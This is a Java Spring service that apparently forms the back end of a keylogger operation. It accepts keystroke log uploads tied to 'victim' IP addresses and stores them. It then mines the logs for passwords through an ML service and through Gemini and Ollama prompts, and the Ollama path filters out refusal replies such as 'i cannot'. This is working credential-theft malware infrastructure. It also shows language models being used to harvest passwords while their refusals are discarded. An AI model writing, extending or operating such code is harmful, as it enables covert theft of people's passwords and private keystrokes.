package org.example.Services;
import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.RequiredArgsConstructor;
import org.example.DTO.HeartbeatAnalyzeResponse;
import org.example.DTO.PasswordPredictionResponse;
import org.example.Entities.Heartbeat;
import org.example.Entities.MlHeartbeatAnalysis;
import org.example.Entities.GeminiHeartbeatAnalysis;
import org.example.Entities.OllamaHeartbeatAnalysis;
import org.example.Entities.Victim;
import org.example.Repositories.HeartbeatsRepository;
import org.example.Repositories.MlHeartbeatAnalysisRepository;
import org.example.Repositories.GeminiHeartbeatAnalysisRepository;
import org.example.Repositories.OllamaHeartbeatAnalysisRepository;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.core.io.ByteArrayResource;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Service;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.RestTemplate;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.server.ResponseStatusException;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.LocalDateTime;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.HashMap;
import java.util.UUID;
import java.util.stream.Collectors;

@Service
@RequiredArgsConstructor
public class HeartbeatsService {

    private final HeartbeatsRepository heartbeatRepository;
    private final VictimsService victimService;
    private final ObjectMapper objectMapper = new ObjectMapper();
    private final RestTemplate restTemplate = new RestTemplate();
    private final MlHeartbeatAnalysisRepository analysisRepository;
    private final GeminiHeartbeatAnalysisRepository geminiAnalysisRepository;
    private final OllamaHeartbeatAnalysisRepository ollamaAnalysisRepository;

    @Value("${ml.threshold}")
    private double threshold;
    @Value("${flask.base-url}")
    private String flaskBaseUrl;

    @Value("${gemini.api.key:}")
    private String geminiApiKey;

    @Value("${ollama.api.url:http://localhost:11434/api/generate}")
    private String ollamaApiUrl;

    @Value("${ollama.model:llama3}")
    private String ollamaModel;

    public Heartbeat saveHeartbeat(String ip, MultipartFile file) throws IOException {
        Victim victim = victimService.getOrCreateByIp(ip);

        String filePath = new File("keylogs").getAbsolutePath() + "/" + UUID.randomUUID() + ".txt";
        File directory = new File("keylogs");
        if (!directory.exists()) {
            directory.mkdirs();
        }
        File savedFile = new File(filePath);
        file.transferTo(savedFile);

        Heartbeat heartbeat = Heartbeat.builder()
                .timestamp(LocalDateTime.now())
                .victim(victim)
                .keyLogFilePath(filePath)
                .build();

        return heartbeatRepository.save(heartbeat);
    }

    public List<Heartbeat> getByVictimId(Long victimId) {
        return heartbeatRepository.findByVictimId(victimId);
    }

    public Heartbeat getById(Long id) {
        return heartbeatRepository.findById(id)
                .orElseThrow(() -> new RuntimeException("Heartbeat not found"));
    }

    public HeartbeatAnalyzeResponse analyzeHeartbeat(Long heartbeatId) {
        Heartbeat heartbeat = getById(heartbeatId);

        var cachedOpt = analysisRepository.findByHeartbeatId(heartbeatId);
        if (cachedOpt.isPresent()) {
            MlHeartbeatAnalysis cached = cachedOpt.get();
            List<String> words = fromJsonList(cached.getWordsJson());
            return new HeartbeatAnalyzeResponse(
                    heartbeatId,
                    cached.getThreshold(),
                    true,
                    words
            );
        }

        byte[] fileBytes;
        String filename;
        try {
            Path path = Path.of(heartbeat.getKeyLogFilePath());
            fileBytes = Files.readAllBytes(path);
            filename = path.getFileName().toString();
        } catch (Exception e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, "Keylog file not readable", e);
        }

        HttpHeaders fileHeaders = new HttpHeaders();
        fileHeaders.setContentType(MediaType.TEXT_PLAIN);

        HttpEntity<ByteArrayResource> filePart =
                new HttpEntity<>(new ByteArrayResource(fileBytes) {
                    @Override
                    public String getFilename() {
                        return filename;
                    }
                }, fileHeaders);

        MultiValueMap<String, Object> body = new LinkedMultiValueMap<>();
        body.add("file", filePart);

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.MULTIPART_FORM_DATA);

        HttpEntity<MultiValueMap<String, Object>> requestEntity =
                new HttpEntity<>(body, headers);

        PasswordPredictionResponse flaskResp;
        try {
            flaskResp = restTemplate.postForObject(
                    flaskBaseUrl + "/predict",
                    requestEntity,
                    PasswordPredictionResponse.class
            );
        } catch (Exception e) {
            throw new ResponseStatusException(
                    HttpStatus.BAD_GATEWAY,
                    "Flask prediction service failed",
                    e
            );
        }

        if (flaskResp == null || flaskResp.getResults() == null) {
            throw new ResponseStatusException(HttpStatus.BAD_GATEWAY, "Empty ML response");
        }

        List<String> filteredWords = flaskResp.getResults().stream()
                .filter(r -> r.getProb_password() > threshold)
                .map(PasswordPredictionResponse.ResultItem::getWord)
                .filter(word -> word != null && word.trim().length() >= 3)
                .collect(Collectors.toList());

        MlHeartbeatAnalysis entity = new MlHeartbeatAnalysis();
        entity.setHeartbeatId(heartbeatId);
        entity.setThreshold(threshold);
        entity.setCreatedAt(LocalDateTime.now());
        entity.setWordsJson(toJsonList(filteredWords));

        analysisRepository.save(entity);

        return new HeartbeatAnalyzeResponse(
                heartbeatId,
                threshold,
                false,
                filteredWords
        );
    }

    private String toJsonList(List<String> words) {
        try {
            return objectMapper.writeValueAsString(words);
        } catch (Exception e) {
            throw new ResponseStatusException(HttpStatus.INTERNAL_SERVER_ERROR, "JSON serialize failed", e);
        }
    }

    private List<String> fromJsonList(String json) {
        try {
            return objectMapper.readValue(json, new TypeReference<List<String>>() {});
        } catch (Exception e) {
            throw new ResponseStatusException(HttpStatus.INTERNAL_SERVER_ERROR, "JSON deserialize failed", e);
        }
    }

    public HeartbeatAnalyzeResponse analyzeGeminiHeartbeat(Long heartbeatId) {
        Heartbeat heartbeat = getById(heartbeatId);

        var cachedOpt = geminiAnalysisRepository.findByHeartbeatId(heartbeatId);
        if (cachedOpt.isPresent()) {
            GeminiHeartbeatAnalysis cached = cachedOpt.get();
            List<String> words = fromJsonList(cached.getWordsJson());
            return new HeartbeatAnalyzeResponse(
                    heartbeatId,
                    0.0,
                    true,
                    words
            );
        }

        String fileContent;
        try {
            Path path = Path.of(heartbeat.getKeyLogFilePath());
            fileContent = Files.readString(path);
        } catch (Exception e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, "Keylog file not readable", e);
        }

        String prompt = "Extract passwords or suspected passwords from the following keystrokes (only 60% more confidence). Take in account that some consecutive words might be phrases having a sense, not passwords. Only return the list of passwords as words separated by comma, no extra text: \n" + fileContent;

        Map<String, Object> requestBody = new HashMap<>();
        Map<String, Object> parts = new HashMap<>();
        parts.put("text", prompt);
        Map<String, Object> contents = new HashMap<>();
        contents.put("parts", List.of(parts));
        requestBody.put("contents", List.of(contents));

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);
        headers.set("x-goog-api-key", geminiApiKey);
        HttpEntity<Map<String, Object>> requestEntity = new HttpEntity<>(requestBody, headers);

        String geminiUrl = "https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent";

        try {
            String flaskResp = null;
            int maxRetries = 3;
            for (int i = 0; i < maxRetries; i++) {
                try {
                    flaskResp = restTemplate.postForObject(java.net.URI.create(geminiUrl), requestEntity, String.class);
                    break;
                } catch (org.springframework.web.client.HttpServerErrorException.ServiceUnavailable e) {
                    System.err.println("Gemini 503 Service Unavailable. Retry " + (i + 1) + "/" + maxRetries);
                    if (i == maxRetries - 1) throw e;
                    try { Thread.sleep(2000); } catch (InterruptedException ie) { Thread.currentThread().interrupt(); }
                }
            }

            System.out.println("Gemini Raw Response: " + flaskResp); 
            com.fasterxml.jackson.databind.JsonNode rootNode = objectMapper.readTree(flaskResp);
            String responseText = "";
            
            if (rootNode.path("candidates").isArray() && rootNode.path("candidates").size() > 0) {
                com.fasterxml.jackson.databind.JsonNode candidate = rootNode.path("candidates").get(0);
                com.fasterxml.jackson.databind.JsonNode content = candidate.path("content");
                if (content.isMissingNode() || content.isNull()) {
                    System.out.println("No content found! Finish reason: " + candidate.path("finishReason").asText());
                } else if (content.path("parts").isArray() && content.path("parts").size() > 0) {
                    responseText = content.path("parts").get(0).path("text").asText("");
                }
            }

            List<String> words = new ArrayList<>();
            if (responseText != null && !responseText.trim().isEmpty()) {
                String[] extracted = responseText.split(",");
                for (String w : extracted) {
                    words.add(w.trim());
                }
            }

            GeminiHeartbeatAnalysis entity = new GeminiHeartbeatAnalysis();
            entity.setHeartbeatId(heartbeatId);
            entity.setCreatedAt(LocalDateTime.now());
            entity.setWordsJson(toJsonList(words));
            geminiAnalysisRepository.save(entity);

            return new HeartbeatAnalyzeResponse(
                    heartbeatId,
                    0.0,
                    false,
                    words
            );
        } catch (org.springframework.web.client.HttpStatusCodeException e) {
            e.printStackTrace();
            System.err.println("Gemini API Error Body: " + e.getResponseBodyAsString());
            throw new ResponseStatusException(HttpStatus.BAD_GATEWAY, "Gemini API rejected request (" + e.getStatusCode() + "): " + e.getResponseBodyAsString(), e);
        } catch (Exception e) {
            e.printStackTrace();
            throw new ResponseStatusException(HttpStatus.BAD_GATEWAY, "Gemini prediction internal failure: " + e.getMessage(), e);
        }
    }

    public HeartbeatAnalyzeResponse analyzeOllamaHeartbeat(Long heartbeatId) {
        Heartbeat heartbeat = getById(heartbeatId);

        var cachedOpt = ollamaAnalysisRepository.findByHeartbeatId(heartbeatId);
        if (cachedOpt.isPresent()) {
            OllamaHeartbeatAnalysis cached = cachedOpt.get();
            List<String> words = fromJsonList(cached.getWordsJson());
            return new HeartbeatAnalyzeResponse(
                    heartbeatId,
                    0.0,
                    true,
                    words
            );
        }

        String fileContent;
        try {
            Path path = Path.of(heartbeat.getKeyLogFilePath());
            fileContent = Files.readString(path);
        } catch (Exception e) {
            throw new ResponseStatusException(HttpStatus.NOT_FOUND, "Keylog file not readable", e);
        }

        String systemPrompt = "You are an automated log parsing assistant. You must ONLY output a comma-separated list of extracted data, or none if it is not possible. Do not include conversational text, apologies, or explanations.";
        String prompt = "Extract passwords or suspected passwords from the following keystrokes (only 60% more confidence). Take in account that some consecutive words might be phrases having a sense, not passwords. Respond only with the list of words separated by , or none if it is not possible. Do not include any other text.\nLog:\n" + fileContent;

        Map<String, Object> requestBody = new HashMap<>();
        requestBody.put("model", ollamaModel);
        requestBody.put("system", systemPrompt);
        requestBody.put("prompt", prompt);
        requestBody.put("stream", false);

        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);
        HttpEntity<Map<String, Object>> requestEntity = new HttpEntity<>(requestBody, headers);

        try {
            String ollamaResp = restTemplate.postForObject(java.net.URI.create(ollamaApiUrl), requestEntity, String.class);
            System.out.println("Ollama Raw Response: " + ollamaResp);

            com.fasterxml.jackson.databind.JsonNode rootNode = objectMapper.readTree(ollamaResp);
            String responseText = rootNode.path("response").asText("").trim();

            List<String> words = new ArrayList<>();
            if (!responseText.isEmpty() && !responseText.equalsIgnoreCase("NONE") && 
                !responseText.toLowerCase().contains("i cannot") && !responseText.toLowerCase().contains("is there anything else")) {
                
                String[] extracted = responseText.split(",");
                for (String w : extracted) {
                    if (!w.trim().isEmpty()) {
                        words.add(w.trim());
                    }
                }
            }

            OllamaHeartbeatAnalysis entity = new OllamaHeartbeatAnalysis();
            entity.setHeartbeatId(heartbeatId);
            entity.setCreatedAt(LocalDateTime.now());
            entity.setWordsJson(toJsonList(words));
            ollamaAnalysisRepository.save(entity);

            return new HeartbeatAnalyzeResponse(
                    heartbeatId,
                    0.0,
                    false,
                    words
            );
        } catch (org.springframework.web.client.HttpStatusCodeException e) {
            e.printStackTrace();
            System.err.println("Ollama API Error Body: " + e.getResponseBodyAsString());
            throw new ResponseStatusException(HttpStatus.BAD_GATEWAY, "Ollama API rejected request: " + e.getResponseBodyAsString(), e);
        } catch (Exception e) {
            e.printStackTrace();
            throw new ResponseStatusException(HttpStatus.BAD_GATEWAY, "Ollama prediction internal failure: " + e.getMessage(), e);
        }
    }
}
